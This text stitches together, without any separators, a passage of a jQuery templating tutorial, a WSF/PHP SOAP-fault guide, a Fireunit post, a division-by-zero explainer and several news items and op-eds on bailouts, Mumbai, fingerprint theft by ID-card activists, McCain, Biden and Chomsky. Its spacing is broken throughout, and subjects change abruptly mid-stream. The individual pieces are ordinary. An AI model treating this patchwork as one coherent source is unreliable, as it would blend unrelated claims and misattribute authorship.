Because it ’s so compact I ’ve integrated the Micro Templating Engine with a few small modifications into my client library ( ww.jquery.js ) .
My customizations from John ’s code change the template delimiters from <% %> to <# # > to avoid issues with ASP .
NET ’s page parser , add some basic error handling and display and fix a small bug that has to do with quote characters .
Listing 6 shows my version of the parseTemplate ( ) function that is based on John ’s original base code .
Listing 6 – A powerful but lightweight Javascript Template Engine /// based on John Resig 's Micro Templating engine var _tmplCache = {} this .
parseTemplate = function ( str , data ) { var err = " " ; try { var func = _tmplCache[str ] ; if ( ! func ) { var strFunc = " var p= [ ] , print=function (){p.push.apply ( p, arguments ) ;} ; " + " with ( obj ) {p.push ( ' " + str.replace(/[\r\t
] /g , " " ) .replace ( / '(?=[ ^# ]*#>) /g , " \t " ) .split ( " ' " ) . join ( " \\ ' " ) .split ( " \t " ) . join ( " ' " ) .replace (/<#=(.+? ) #>/g , " ' , $ 1 , ' " ) .split ( " < # " ) . join ( " ' ) ; " ) .split ( " # > " ) . join ( " p.push ( ' " ) + " ' ) ; }return p.join ( '' ) ; " ; func = new Function ( " obj " , strFunc ) ; _tmplCache[str ] = func ; } return func( data ) ; } catch ( e ) { err = e.message ; } return "< # ERROR : " + err.htmlEncode ( ) + " # > " ; }
The idea of a template engine is that you can create markup as you normally do , but embed the data as Javascript expressions right into the content using tag delimiters .
Hey we know how to do that already in ASP.
NET with <% %> tags .
The difference is we want to do this on the client rather than on the server .
For example , in the StockPortfolio application the individual user portfolio items are rendered using the parseTemplate ( ) function .
When the page first loads no data is rendered into the list .
Instead client script requests the portfolio items as an array which is then parsed one item at a time using the template .
The same template is also used to update items when the user changes a quantity or symbol or adds new items .
Templates allow you to design the layout and data display in one place and re-use that template , potentially in multiple places .
The template for an individual portfolio item looks like this : < script type = " text / html " id =" StockItemTemplate " > < div class= " itemtemplate " style =" display : none " > < div class= " stockicon " ></div > < div class= " itemtools " > < a href= " javascript:{} " class= " hoverbutton " >
< img src= " ../images/remove.gif "
/></a> </div > < div class=" itemstockname " ><#= Symbol #> - <#= Company #></div> < div class=" itemdetail " > < table style= " padding : 5 px ; " >< tr > < td > Last Trade :</td > < td id =" tdLastPrice " class=" stockvaluecolumn " ><#= LastPrice.formatNumber ( " n2 " ) #></td> < td> Qty:</td> < td id =" tdLastQty " class=" stockvaluecolumn " ><# = Qty #></td> < td> Holdings :</td > < td id =" tdItemValue " class=" stockvaluecolumn " ><#= ItemValue.formatNumber ( " c " ) #></td> < td id =" tdTradeDate " colspan= " 2 " ><#= LastDate.formatDate ( " MMM dd , hh:mmt " ) #></td> </tr></table >
</div> </div > </ script >
Note the < script > tag which is a great way to hide the template from normal HTML markup .
The above is valid HTML and any XHTML parser and robot will simply ignore this script block as if it was n’t there .
Yet the content of the script – the template string - can still be retrieved based on its id .
This template is passed a stock quote object and the properties of the quote are accessed inside the < # = #> expressions .
The expressions are plain Javascript expressions and you can see that some of the values call functions like formatNumber and formatDate which are part of the ww.jquery.js library .
You can also embed code blocks into the page to loop through items which I ’ll show a little later .
Let ’s look and see how the client code can retrieve the stock quote data .
Listing 7 shows the code to retrieve the portfolio items and then iterate through them and merge them into the template one at a time .
Listing 7 – Updating a List of Items using Client Templating function LoadQuotes ( noMsg ) { proxy.invoke ( " GetPortfolioItems " , { userToken : userToken } , function ( message ) { $ ( " #lstPortfolioContainer " ) .empty ( ) ; $.each ( message .
Items , function ( i ) { var item = this ; // this is the iterated item ! var newEl = UpdatePortfolioItem( item ) ; } ) ; } , OnPageError ) ; } function UpdatePortfolioItem ( stock ) { //
Retrieve the Item template var template = $ ( " #StockItemTemplate " ) .
html ( ) ; //
Parse the template and merge stock data into it var html = parseTemplate ( template , stock ) ; //
Create jQuery object from gen'd html var newItem = $ ( html ) ; //
See if we have an existing item var origItem = $ ( " # " + stock .
Pk + " _STOCK " ) ; if ( origItem.length < 1 ) newItem.appendTo(" #lstPortfolioContainer " ) ; else origItem.after(newItem ) .remove( ) newItem.attr ( " id " , stock .
Pk + " _STOCK " ) .click ( function ( ) { ShowStockEditWindow ( this ) } ) . fade In ( 1500 ) ; return newItem ; } There ’s not a lot of code in this sample and that ’s really the point .
The only thing of interest in regards to templating is the retrieval of the template and then merging it with these two lines of code : var template = $ ( " #StockItemTemplate " ) . html ( ) ; var html = parseTemplate ( template , stock ) ;
The first line simply returns the template as a string from the script block .
The second then merges the stock quote into the template and returns a string result of the merged data for an individual stock item .
The html is then turned into a jQuery object that then either replaces an existing item or adds a new one to the list .
The UpdatePortfolioItem ( ) function is called from LoadQuotes ( ) as shown , but it ’s also called from UpdatePortfolioItem ( ) which updates or adds new items to the list .
So this function and the template are re-used in multiple locations without duplicate code or markup .
One piece of code , one piece of markup all maintained in one place – that ’s the benefit of using templates .
parseTemplate ( ) can also work with code blocks so you can do things like loop through a list .
The following is another example provided in BookAdmin.aspx .
One of the forms displays a search result from Amazon as list that looks as shown in Figure 7 .
Figure 7 – The Amazon Book list uses client side Javascript templating to render the list
In the previous example I used a single item template to add one item at a time to the list and used Javascript code to loop through the items .
In this example , a single html string is generated for the entire list based on the template and the template does the iteration .
The following template uses code blocks and a for loop to run through all of the books .
< script type =" text / html " id=" amazon_item_template " > <# for ( var i=0 ; i<bookList.length ; i++) { var book = bookList [ i ] ; #> < div class=" amazonitem " ondblclick =" selectBook ( this ) ; " tag= " < #= book .
Id # > " > < img src= " < #= book .
SmallImageUrl # > " class=" imgAmazonSearch " /> < div ><b>< #= book .
Title #></b></div> < div ><i>< #= book .
Publisher #>
( < # = book .
PublicationDate #>)</i></div> < small >< #= book .
Author #></small > </div > <# } #> </ script >
Note the <# #> blocks that allow any sort of Javascript code to be embedded .
parseTemplate effectively works by taking the template and turning it into an executing Javascript function and so just about all Javascript code can be used in code blocks .
You can loop , you can use if statements to display content conditionally and you can access any global code that is in scope .
Templating is an extremely powerful mechanism for building rich client applications without having to generate HTML by hand , filling holes explicitly and most importantly not repeating yourself when creating HTML markup .
parseTemplate( ) is only one templating mechanism but the general concepts are similar in most template engines .
There are a host of other template solutions available for jQuery .
I ’ve also used jTemplates for quite some time prior to this implementation and it works well , and there are several other engines available that I have n’t used .
Using AjaxMethodCallback in jQueryControls
The BookAdmin example actually uses yet another callback mechanism which is provided as part of the jQueryControls project .
This project contains an AjaxMethodCallback control which can make JSON callbacks to the same page , a user or server control on the same page or an external HttpHandler to handle JSON callbacks .
The control is based on a combination of client script and a server wrapper control that combine to provide the callback capability .
The server control is optional – you can also use the AjaxMethodCallback client library on its own and it operates similar to the way ServiceProxy works .
The easiest way to use this functionality is to use the control and drop it onto the page or insert it via markup :
<ww:AjaxMethodCallback ID =" Proxy " runat= " server " />
This uses all default settings which allow to call back to the current page and post back only method parameters .
Alternately you can call an external handler and specify how POST data is to be sent .
<ww:AjaxMethodCallback ID = " Proxy " runat= " server " ServerUrl= " AdminCallbackHandler.ashx " PostBackMode= " PostNoViewstate " />
In the BookAdmin page callbacks are made using an ASHX handler which is the most efficient way , but realize that the methods of the handler shown below could easily have been created as methods of the current form .
Like WCF and ASMX services you can create simple methods that are called from the client and receive JSON parameters and return a JSON response .
Here ’s is a single method in the BookAdmin. ashx handler implementation : /// < summary > /// Callback handler for Amazon Books Page /// </ summary > public class AdminCallbackHandler : CallbackHandler { private busBook books = new busBook ( ) ; [ CallbackMethod ] public List < AmazonBook > GetBooks ( string filter ) { if ( filter == null ) filter = string .
Empty ; IQueryable < AmazonBook > bookList = null ; if ( filter == " Highlighted " ) bookList = books .
GetHighlightedBooks ( ) ; else if ( filter == " Recent " ) bookList = books .
GetRecentBooks ( ) ; else bookList = books .
GetBooks ( ) ; return bookList.
ToList ( ) ; }
} The handler needs to inherit from CallbackHandler which provides all the necessary plumbing to marshal the request to the appropriate method , call it and return a result back to the client .
On the client the server code is easy to call and uses a client proxy that works in the same way that the WCF / ASMX proxy works .
The proxy is created with the same name as the AjaxMethodCallback control ’s Id – Proxy in this case and has methods for each of the exposed server methods .
Each method has the same parameter signature as the server method plus the callback and errorCallbacks – just like service proxies discussed earlier .
To call the server is as easy as : function editBook ( ctl ) {
var bookPk = $ ( ctl ) . attr ( " id " ) . replace ( " book_ " , " " ) ;
bookPk = parseInt ( bookPk ) ;
Proxy .
GetBook ( bookPk , function ( book ) { // object result alert ( book .
Title + " " + book .
AmazonUrl ) ; ShowBookForm ( book ) ; } , onPageError ) ; }
The actual page code in the sample of course is a bit more complex and it uses jQuery to pop up and display the edit window and populate its form fields .
What is nice about AjaxMethodCallback is that it ’s fully self contained and loads up jQuery.js and the ww.jquery.js script library ( optionally – you can override resource load behavior ) so you drop the control add methods and you ’re on your way , and it does n’t require any of the ASP .
NET AJAX or WCF components .
One additional benefit of this control is also the ability to use it to handle callbacks in page and control code .
This means if you build a custom ASP.
NET server control that needs to retrieve data from the client directly ( rather than through a service reference ) , it ’s easy to do by simply adding an AjaxMethodCallback to the page ’s controls collection and pointing it at the class that will handle callbacks .
Any class can be pointed at to handle callback events .
Summary Phew – a lot of options for you to calling back to the server using jQuery .
In this article I ’ve covered both manually using ASP.
NET pages to handle callback routing and returning both HTML and JSON data to the client .
I ’ve also covered three – count ‘em – mechanisms for making JSON based server callbacks that let you pass data between client and server .
Which approach is best ?
As always it depends .
For existing applications that need to add a little bit of AJAX functionality page level callbacks that return HTML fragments can be a quick way to provide little bits of content to update the client .
Control or user control rendering can provide reuse of server side components , or you can generate HTML from scratch to return to the client .
Personally I prefer the ‘ raw ’
Ajax approach which uses the server as a data service for serving JSON data to the client and then update the client using either small chunks of DOM manipulation or for more complex or markup intensive items using templates .
It ’s a little more work but you can do so much more interesting stuff and you have way more control over your user interface .
When it comes to callbacks to the server you have lots of choices .
I discussed three callback mechanisms – WCF , ASMX and AjaxMethodCallback .
WCF or ASMX are no brainers if you ’re already using ASP .
NET AJAX .
If you ’re not using ASP .
NET AJAX you can still use either WCF / ASMX on the server and use the ServiceProxy class and the JSON parsers I introduced in the article on the client .
Doing so lets you avoid loading the ASP .
NET AJAX client library which is overkill if you only need to make service callbacks .
AjaxMethodCallback is very easy and fully self contained so you can just drop a control and you ’re ready to go .
It also is a bit more flexible since you can use the server component on a Page , a user or server control , in a high performance Http Handler or even your own custom handling code via the generic JsonCallbackMethodProcessor class which does all the dirty work of parsing input and output and generating JSON .
All approaches make it easy to make callbacks to the server with literally just a single line of code , so that you can focus on using the data returned effectively and use jQuery to update the UI .
After all that ’s really what it ’s all about – service callbacks should be just plumbing and the logic of applying the results is where the real work usually comes in and that ’s where jQuery really excels .
If you ’re building complex or repetitive UI layouts client side make sure you check out templating for merging Javascript based templates with data .
Templates make sure you do n’t repeat yourself and keep your layout in one place even though you are working on the client side .
I hope Part 2 of this article has been useful to you .
In Part 3 I ’ll look a bit closer at integration between ASP.
NET and jQuery in terms of creating server controls .
I touched on this topic a little with the AjaxMethodCallback control which integrates client jQuery components and plug-ins and a server control .
I ’ll look deeper into how you can build reusable ASP.
NET components that interact with jQuery .
Until have fun calling server side code with jQuery .

FORT COLLINS , Colo. , Nov. 21 ( UPI ) -- A U.S. psychologist links deja vu -- being in a new situation and feeling sure you have experienced it before -- to recognition memory .
In a report , published in Current Directions in Psychological Science , Anne Cleary of Colorado State University says deja vu may occur when aspects of a current situation resemble aspects of previously occurring situations -- the more overlap between the elements of the new and old situations the stronger the feeling of familiarity

" Many parallels between explanations of deja vu and theories of human recognition memory exist , " Cleary says in a statement .
" Theories of familiarity - based recognition and the laboratory methods used to study it may be especially useful for elucidating the processes underlying deja vu experiences . "
In experiments using celebrity names and photographs Cleary found even when the participants were unable to identify a celebrity by photo , they had a sense of which names they had mentioned earlier and which had not .
The same thing happened in an experiment using famous places .
Cleary also ran experiments that found features or elements of situations can trigger feelings of familiarity .
Simply hearing a word that sounds similar to another -- for example lady and eighty -- or seeing a geometric fragment of a scene seen before can trigger familiarity .
At one point during a hearing on the bank bailout in the House of Representatives on Tuesday , Treasury Secretary Henry M. Paulson Jr. said that he was being misunderstood about why he refused to use any of the $ 700 billion bailout fund to prevent foreclosures .
He has made it clear that he knows the housing bust is at the root of the financial crisis and the economic downturn .
But he said at the hearing that using the bailout money for foreclosure relief would violate the intent of the rescue approved by Congress because it would be a “ direct subsidy ” rather than an “ investment . ”
Direct subsidy is a synonym for government spending , which the Bush administration seems to believe promises no chance of ever yielding a return .
Investing , on the other hand , say in stocks , holds out the hope of getting one ’s money back .
In an exchange with Representative Barney Frank , the Massachusetts Democrat who is chairman of the House Financial Services Committee , it quickly became apparent that it was Mr. Paulson who did not understand the intent of Congress as expressed in the bailout bill .
And in subsequent testimony by another witness  Sheila Bair , the chairwoman of the Federal Deposit Insurance Corporation  Mr. Paulson ’s simplistic distinction between direct spending ( bad ) and investing ( good ) was demolished .
On Feb. 6 , 2006 , three Pakistanis died in Peshawar and Lahore during violent street protests against Danish cartoons that had satirized the Prophet Muhammad .
More such mass protests followed weeks later .
When Pakistanis and other Muslims are willing to take to the streets , even suffer death , to protest an insulting cartoon published in Denmark , is it fair to ask :
Who in the Muslim world , who in Pakistan , is ready to take to the streets to protest the mass murders of real people , not cartoon characters , right next door in Mumbai ?
After all , if 10 young Indians from a splinter wing of the Hindu nationalist Bharatiya Janata Party traveled by boat to Pakistan , shot up two hotels in Karachi and the central train station , killed at least 173 people , and then , for good measure , murdered the imam and his wife at a Saudi - financed mosque while they were cradling their 2 - year - old son  purely because they were Sunni Muslims  where would we be today ?
The entire Muslim world would be aflame and in the streets .
So what can we expect from Pakistan and the wider Muslim world after Mumbai ?
India says its interrogation of the surviving terrorist indicates that all 10 men come from the Pakistani port of Karachi , and at least one , if not all 10 , were Pakistani nationals .
First of all , it seems to me that the Pakistani government , which is extremely weak to begin with , has been taking this mass murder very seriously , and , for now , no official connection between the terrorists and elements of the Pakistani security services has been uncovered .
Why can't we divide by zero ?
The reason that the result of a division by zero is undefined is the fact that any attempt at a definition leads to a contradiction .
To begin with , how do we define division ?
The ratio r of two numbers a and b :
r=a /b
is that number r that satisfies
a=r*b .
Well , if b=0 , i.e. , we are trying to divide by zero , we have to find a number r such that
r *0=a . ( 1 )
r*0=0
Now you could say that r=infinity satisfies ( 1 ) .
That 's a common way of putting things , but what 's infinity ?
It is not a number !
Why not ?
Because if we treated it like a number we 'd run into contradictions .
Ask for example what we obtain when adding a number to infinity .
The common perception is that infinity plus any number is still infinity .
If that 's so , then
infinity = infinity +1 = infinity + 2
which would imply that 1 equals 2 if infinity was a number .
That in turn would imply that all integers are equal , for example , and our whole number system would collapse .
What about 0/0 ?
I said above that we can't solve the equation ( 1 ) unless a=0 .
So , in that case , what does it mean to divide by zero ?
Again , we run into contradictions if we attempt to assign any number to 0/0 .
Let 's call the result of 0/0 , z , if it made sense .
z would have to satisfy
z *0=0 . ( 2 )
That 's OK as far as it goes , any number z satisfies that equation .
But it means that the result of 0/0 could be anything .
We could argue that it 's 1 , or 2 , and again we have a contradiction since 1 does not equal 2 .
But perhaps there is a number z satisfying ( 2 ) that 's somehow special and we just have not identified it ?
So here is a slightly more subtle approach .
Division is a continuous process .
Suppose b and c are both non-zero .
Then , in a sense that can be made precise .
the ratios a /b and a / c will be close if b and c are close .
A similar statement applies to the numerator of a ratio ( except that it may be zero . )
So now assume that 0/0 has some meaningful numerical value ( whatever it may be - we do n't know yet ) , and consider a situation where both a and b in the ratio a/b become smaller and smaller .
As they do the ratio should become closer and closer to the unknown value of 0/0 .
There are many ways in which we can choose a and b and let them become smaller .
For example , suppose that a=b throughout the process .
For example , we might pick
a=b = 1 , 1/2 , 1/3 , 1/4 , ....
Since
a=b ,
for all choices of a we get the ratio 1 every time !
This suggests that 0/0 should equal 1 .
But we could just as well pick
b = 1 , 1/2 , 1/3 , 1/4 , ....
and let a be twice as large as b .
Then the ratio is always 2 !
So 0/0 should equal 2 .
But we just said it should equal 1 !
In fact , by letting a be r times as large as b we could get any ratio r we please !
So again we run into contradictions , and therefore we are compelled to
let 0/0 be undefined .
It 's a common strategy in teaching to simplify concepts when they are first encountered .
In other words , it 's common for your teacher to lie to you .
I just did !
Actually , there is a way to make sense of the expression 0/0 .
The basic idea is to let both the numerator and the denominator become smaller and smaller , and to make the value of 0/0 dependent upon the way in which numerator and denominator approach 0 .
This is explained more thoroughly here .

Web Service can response with a Fault in 2 occasions .
Fault send by the web service framework .
( E.g. Invalid authentication , invalid signature found )
Fault send by the user business logic .
There is a slightly difference in the content of SOAP 1.1 and SOAP 1.2 .
But they mainly contain the following elements .
Code – A code to represent the classification of the fault .
Possible fault codes can be found , http://www.w3.org/TR/soap12-part1/#faultcodes
Reason – A human readable details of the reason .
Details – More information about the details , mostly supposed to be read by the client application .
Role – Indicates which SOAP header caused the fault .
This is very rarely used in faults send from the business logic .
Sending SOAP Faults
In WSF / PHP you have the WSFault class to deal with SOAP faults .
You can send a fault in your service logic by throwing an instance of WSFault class like this .
/** * divide mathematical operation * @param int $ dividend * ( maps to xs:int ) * @param int $ divisor * ( maps to xs:int ) * @return float $ result * ( maps to xs: float ) */ function divide ( $ dividend , $ divisor ) { // dividing from 0 is invalid , we wil * throw * fault in such cases .. if ( $ divisor == 0 ) { throw new WSFault ( " Sender " , " dividing from 0 is invalid " ) ; } $ result = ( float ) $ dividend / $ divisor ; return array ( " result " => $ result ) ; }
Here I have throw an WSFault whenever I encounter my divisor is zero .
And the WSF / PHP will take care of building the SOAP message according to the given version ( default is to SOAP 1.2 ) and send back to the client .
Handling SOAP Faults
Similar to the service , client API also treat the SOAP fault as an instance of WSFault .
So whenever you do a web service request , put inside try , catch block so you can catch exception in case of fault is received .
Here is an example of handling fault while calling the divide operation in the above example .
// creating the client , we retrieved the wsdl from service url + ? wsdl $ client = new WSClient ( array ( " wsdl " => " http://localhost/myblog/fault_service.php?wsdl " ) ) ; $ proxy = $ client -> get Proxy ( ) ; try { // calling the operation $ response = $ proxy -> divide ( array ( " dividend " => 5 , " divisor " => 0 ) ) ; // printing the result echo $ response [ " result " ] ; } catch ( Exception $e ) { // if the instance is WSFault we print the code and the reason if ( $e instanceof WSFault ) { printf ( " Soap Fault Reason : %s
" , $ e -> Reason ) ; printf ( " Soap Fault Code : %s
" , $ e ->
Code ) ; } else { printf ( " Message = %s
" , $e -> getMessage ( ) ) ; } }
As you can see WSF / PHP covers the complexity of building and handling SOAP faults , Rather it gives you an API with the use of PHP Exception Construct that you already familiar with .

The bank said it was far from clear whether the US would be able to shrug off the consequences of its latest imbalances , citing a current account deficit running at 6.5 pc of GDP , a rise in US external liabilities by over $ 4 trillion from 2001 to 2005 , and an unpredented drop in the savings rate .
" The dollar clearly remains vulnerable to a sudden loss of private sector confidence , " it said .

From soon after 8 pm until just before 11 pm the planets Venus and Jupiter will stare down from the western sky like two brilliant eyes .
Directly below , the crescent moon will form a happy mouth .
" I think it will be very spectacular , " Sydney Observatory 's astronomer , Nick Lomb , said .
" The three brightest objects in the night sky will all be in the same patch of the sky . "
As the night draws on , Dr Lomb predicted , " the smiley face " - with Venus playing the left eye and giant Jupiter the right - " will improve and become a little more compact " .
To the superstitious , unusual astronomical apparitions were often seen as omens .
While Dr Lomb said he did not believe in such things , he noted that Monday 's smiling face will appear on the eve of the next Reserve Bank 's meeting at which it will consider interest rates .
" There was an upside - down sad face visible on the morning of April 23 , 1998 , " he recalled .
That day 's Herald was dominated by news of conflict on Australia 's waterfront , protests against child - care costs , big rises in bank fees and executions in Rwanda .
Dr Lomb urged people to attempt to photograph tonight 's heavenly show , which will not smile on the US or Europe .
" It should be very easy to take a photograph with a digital camera and a tripod .
Use a one - , two - or three - second exposure and , of course , no flash . "
However the cosmic cheeriness will be a fleeting affair .
Another smiley face will not grin over Australia until the early hours of July 21 , 2036 .
Sydney Observatory will stay open for tonight 's show , allowing people to stare back through telescopes and glimpse Jupiter 's moons , Venus 's gibbous shape and lunar craters .

Anti-ID card campaigners have stolen the fingerprints of home secretary Jacqui Smith .
An activist , who wishes to remain anonymous , attended Ms Smith 's speech at the Social Market Foundation yesterday , where the home secretary announced a pilot project of ID cards for two airports ' security workers .
No2ID national coordinator Phil Booth told politics.co.uk : " He kept a beady eye on her glass of water throughout the speech then at the end of the event he nabbed it . "
The group then took the glass to an undisclosed location and worked on solidifying the print .
Fingerprints consist primarily of sweat and oil , so they degrade very quickly .
The group used the active ingredient in super - glue to turn the fat in the fingerprint into a solid white deposit .
This transforms a barely visible fingerprint into a permanent white mark .
No2ID said the action shows how easy it is to steal someone 's identity , and how much easier it will be to do so once the government rolls out its ID card programme .
The government is understood to be using fingerprints as the sole biometric standard on ID cards .
Rumours from party officials that other forms of biometric information , like iris scans , would be included on the cards are flatly refuted by No2ID .
" They 're using fingerprints as the sole biometric standard , " Mr Booth said .
" You cannot take anything that the Home Office say about the technology as being real until they give you a precise specification of what they 're doing and you check it out with actual experts .
" They just talk absolute twoddle .
They do n't know what the hell they 're talking about when it comes to biometrics . "
A UK border agency spokeperson told politics .
co.uk fingerprint theft did not threaten the ID card scheme .
" No one can take someone fingerprints and use them as their own in the same way a fraudster might use someone pin or forge their signature , " the spokesperson said .
" A copy of fingerprints can not be used to enrol on the national identity scheme .
Enrolment will be supervised by trained staff using sophisticated technology to spot so called ' fakes ' .
We 'll not rely on biometric alone . "
Mr Booth told politics .
co.uk it was the third attempt he was aware of to steal Ms Smith 's fingerprint , although many anti-ID card actions take place without the knowledge of No2ID .
The action follows similar moves in Germany where a group called Computer Chaos Club succeeded in stealing the fingerprint of the country 's interior minister .
I 've been recently working with John Resig on his great Firebug extension called Fireunit .
This very promising extension is intended as an automated testing framework for Firefox extensions and it should also be useful for testing web pages in the future .
It 's still at the beginning , but growing and starting to be very useful for testing Firebug itself .
Such unit test framework is what I have been waiting for a long time .
Not only debugging and profiling is important and the unit testing was the missing piece in the Firebug world .
User Interface
My goal was to improve Fireunit 's UI and make the output more transparent for users .
Let 's take a quick look how it looks now .
As you can see Fireunit brings a new Test panel that displays list of results from executed tests .
Each entry is expandable so , some additional info about particular message can be discovered .
Since Fireunit's APIs allow to compare expected and actual state of the UI ( HTML in most cases ) , there can be even additional info tab displaying if the message comes from this kind of test .
Example Test
Running a test is as simple as navigating your browser to a test page .
Try an empty example test here ( sure you need Fireunit ) .
Once the test finishes the Test panel should be displaying two passing and two failing tests .
The test page looks like as follows .
This is the lead on a story just out over the Reuters wire …
Republican presidential candidate John McCain said on Friday that his Democratic opponent , Barack Obama , is likely to be in Iraq over the weekend .
The Obama campaign has tried to cloak the Illinois senator ’s trip in some measure of secrecy for security reasons .
The White House , State Department and Pentagon do not announce senior officials ’ visits to Iraq in advance .
“ I believe that either today or tomorrow — and I ’m not privy to his schedule — Sen. Obama will be landing in Iraq with some other senators ” who make up a congressional delegation , McCain told a campaign fund - raising luncheon .
The Reuters piece hints at it .
But if Obama is going to be in Iraq this weekend , this is a major breach on McCain ’s part .
As a knowledgeable insider notes …
If it is true that Obama is going to Iraq this weekend , it is a very serious mistake for McCain to have disclosed it publically .
Even for run -of - the - mill CODELs the military gives guidance like , “ Please strongly discourage Congressional offices from issuing press releases prior to their trips which mention their intent to travel to the AOR and / or the dates of that travel or their scheduled meetings .
Such releases are a serious compromise to OPSEC . ”
If Obama is going to Iraq this weekend , I can not begin to imagine how much this is complicating the security planning for the trip .
It ’s known that Obama is leaving on his foreign trip this weekend and the Journal OpEd page this morning said that Obama could arrive in Iraq “ as early as this weekend . ”
And with a slew of reporters in tow , it ’s not exactly highly classified information .
But there is a reason definite information about these sorts of trips are n’t released in advance .
Hypothetically , maybe McCain was just guessing .
But even so it would still be a serious lapse of judgment on his part .
We ’re seeing what more we can find out .
Here 's another video that surfaced relatively recently that is from September 10th , 2001 , just one day before the attacks , where Biden is giving a speech to the National Press Club about how the real threats to the United States wo n't come in the form of a huge missile from a more than obvious location ( you ca n't hide things like ICBM firing locations ) , but rather from the hold of a ship , the belly of a plane , etc ... exactly what happened one day later .
Joe Biden is exactly the right person to have at Obama 's side in his administration , and just how good a choice it was to have him as VP becomes clearer every day .
As far as I know there 's no transcript of this part of the speech so I 've typed it out .
The part in bold is the part , in my opinion , that is most quoteworthy .
Our real security needs are much more earthbound , and far less costly than national missile defense .
If you combine the $ 1.3 trillion tax cut with what we spend on a full - blown defence shield , we could start to modernize our conventional forces , build a stealthier , more mobile , more self - sufficient military that I believe is needed in the 21st century , and make significant impact on rectifying what it going to be a gigantic problem in ten years in social security .
Let 's be clear .
When it comes to defence , it 's not the president 's missile defence or nothing , as the way it 's being posed .
We should improve military personnel retention and overall readiness .
Bring on the next generation of fighter aircraft , the next generation of helicopters , the next generation of destroyers , and be fully prepared for the next generation of engagement .
And while we 're at it , we might fix the plumbing in the barracks at Taipei , which I just visited , which the night before I came , because they are so aged , and we do n't have the money to fix them , they had to bring in water hoses from outside to allow the women and men in there to be able to shave , to be able to use the bathrooms , let alone drink any water .
Visit the conditions in which our active military are living now .
Two and three in a room , you think when you drop your kid off at a college dormitory and you 're paying 30 grand to send them to a prestigious school is hard to take , take a look at the conditions they live in .
And why are we not responding to it ?
We do n't have the money , we are told .
My dad used to say and still says , " Son , if everything is equally important to you , nothing is important to you . "
Our priorities , I think , are a little out of whack .
But even the joint chief says that a strategic nuclear attack is less likely than a regional conflict , a major theater war , terrorist attacks at home or abroad , or any number of other real issues .
We 'll have diverted all that money to address the least likely threat , while the real threat comes to this country in the hold of a ship , the belly of a plane , or smuggled into a city in the middle of the night in a vial in a backpack .
And I ask you , you want to do us damage , are you more likely to send a missile you 're not sure can reach us with a biological or chemical weapon because you do n't have the throw - weight to put a nuclear weapon on it -- and no one 's anticipating that in the near term -- with a return address saying it came from us , here 's where we are ?
Or are you more likely to put somebody with a backpack crossing the border from Vancouver down to Seattle ?
Or coming up the New York Harbor with a rusty old ship with an atom bomb sitting in the hull ?
Which are you more likely to do ?
And what defence do we have against those other things ?
Watch these hearings we 're about to have .
We do n't have as the testimony showed , a public health infrastructure to deal with the existing pathogens that are around now .
We do n't have the investment , the capability to identify or deal with an anthrax attack .
We do not have , as Ambassador to Japan now Howard Baker and his committee said , the ability to curtail the availability of chemical weapons lying around the Soviet Union , the former Soviet Union and Russia , because they do n't know what to do with it .
They showed us a report where they showed us photographs of things that look like large outhouses , clapboard buildings , with no windows and padlocks on the door , that have as many chemical weapons in that building to destroy the bulk of the east coast !
And we 're not spending the money , to help them corral and destroy that in the name of this search ?
Folks , let 's not now raise the starting gun on a new arms race that is sure , I promise you , to make my children and my grandchildren , and these students assembled here , feel less secure than we feel today .
Thank you very much for listening .
The Washington Post had an article on that speech on September 11th ( I assume it was early morning , before the attacks ) , but only had a few excerpts from the speech .
While the White House and Congress have been embroiled in negotiations over the $ 700 billion bailout of the nation ’s bedraggled banks , another bailout of sorts passed Congress just under the radar : $ 25 billion in subsidized loans for Detroit ’s bedraggled automakers .
The burst of government generosity last week inspires two thoughts .
There is a long list of troubled industries that could easily put government billions to good use .
But public finances are looking more stretched with each passing bailout .
So it is probably a good idea for Congress , and the administration , to refrain from giving another big chunk of the corporate sector more money , at least for the time being .
Moreover , while the money is ostensibly meant to further the cause of fuel efficiency , we fear Detroit ’s automakers will be tempted to put it to other uses .
The Department of Energy , which is in charge of writing detailed criteria for car companies to get the loans , should include a provision for strict oversight of the program to ensure that the money is not diverted to other purposes .
The loans are limited to plants that have been around for at least 20 years , which pretty much limits the help to the gas - guzzling trio from Michigan and three Honda plants .
It is supposed to be used to retool old car and parts plants to make vehicles that achieve at least 25 percent better gas mileage than similar models in their class  hardly a difficult target , according to experts from the Union of Concerned Scientists .
EXTREME Small Calibers
While at a large outdoors show , I stopped by Tom Thomas booth .
For those of you who arent familiar with him , he is the owner of The Outdoorsman and handles a lot of small caliber rifles including Cooper , Cascade , Kimber , and others .
Dan Cooper happened to be there that day representing Cooper Arms .
I had lengthy conversations with Dan and Tom about the small calibers .
Toms wife handed me two small plastic bags with the stuff that I had bought .
I didnt look at them very closely until leaving , but they were promotional cartridges from Bill Eichelberger .
Bill Eichelberger is considered the industry expert for all of the sub .17 calibers .
He has manuals for the .14 ( I have this one ) and for the .12 .
He has recently done some work with the .10 calibers and the two cartridges that I got were .10 caliber .
Yes , thats right , I said .10 caliber .
Why you might ask , does anybody need a .10 caliber .
Below is a picture of the two cartridges with a .22 long rifle round in the middle for comparison sake .
These wildcats are based on the CCM case and the .25ACP case and are called the Dart and the Pup .
I dont have any performance information on these , just the cases .
I am very glad to have received these cases and look forward to working with a .14 sometime soon .
Think small .
I want to start out by thanking anyone who has ever spent the time to send fan mail my way .
I now want to apologize to the fans who sent in ...
In his penetrating study of language , MIT linguist Noam Chomsky has given us a framework that is to culture what the genetic code is to life .
“ Noam Chomsky ’s position in the history of ideas is comparable to that of Darwin or Descartes , ” University College London linguist Neil Smith declared in Nature .
“ Chomsky has redefined our understanding of ourselves as humans . ”
Chomsky ’s works , most notably
Syntactic Structures
( 1957 ) and
Aspects of the Theory of Syntax
( 1965 ) , presented a revolutionary approach to understanding language structure , known as generative grammar , positing that every child has the innate capacity to master language .
Chomsky ’s finding that language is genetically determined and part of the evolutionary process ultimately overturned the once popular notion that language comes to children through imitation and conditioning .
In addition to being a linguistic scholar , Chomsky has earned a worldwide reputation as an impassioned and informed political writer .
His observations , which grew out of his opposition to the Vietnam War and , later , what he saw as the United States ’ resorting to violence and other forms of coercion and domination abroad , thrust him into the spotlight and have made him one of the top pundits and gadflies of the day .
One reason for Chomsky ’s enormous influence in both the “ hard ” and social sciences may be his willingness to share ideas and his embrace of open debate .
“ I do n’t want any followers , ” Chomsky once told an interviewer .
“ My message , especially to students , is that they should n’t be following anyone . ”
An appreciation of Chomsky by Steven Pinker , professor of psychology at Harvard University and author of
The Stuff of Thought : Language as a Window Into Human Nature :
